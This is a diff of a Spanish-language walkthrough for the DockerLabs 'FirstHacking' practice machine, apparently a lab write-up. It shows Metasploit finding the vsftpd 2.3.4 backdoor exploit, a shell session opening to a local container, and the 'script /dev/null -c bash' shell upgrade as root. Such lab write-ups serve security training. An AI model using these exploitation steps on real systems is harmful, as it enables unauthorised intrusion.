@@ -1,4 +1,3 @@
-#escalada #ftp #ssh #hydra #sudo-l #bash_-p 
 Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "FirstHacking".
 Una vez hecho , descomprimimos el archivo, e inicializamos la maquina con el comando:
 ```
@@ -25,9 +24,9 @@ msf6 > search vsftpd 2.3.4
 ```
 Y nos dice:
 ```
-#  Name                                Disclosure Date  Rank Check  Description
--  ----                                -----------  --------   -----  ---------
-0 exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No  VSFTPD v2.3.4 Backdoor Command Execution
+#  Name                                Disclosure Date  Rank       Check  Description
+-  ----                                -----------  	--------   -----  ---------
+0 exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  	excellent   No    VSFTPD v2.3.4 Backdoor Command Execution
 ```
 Como se puede observar hay un exploit de "Backdoor Command Execution", por lo que ahora solo tendremos que elegirlo y ver sus opciones:
 ```
@@ -66,7 +65,7 @@ Y vemos lo siguiente:
 [*] Found shell.
 [*] Command shell session 1 opened (172.17.0.1:35539 -> 172.17.0.2:6200) at 2024-07-07 23:25:21 +0200
 ```
-Ahora si escribimos "whoami" veremos que somos root. No obstante, para obtener un prompt decente, escribiremos tambien "script /dev/null -c bash"
+Ahora, al escribir "whoami" vemos que somos root. Aun asi, para obtener un prompt decente, escribimos tambien "script /dev/null -c bash"
 ```
 whoami
 root
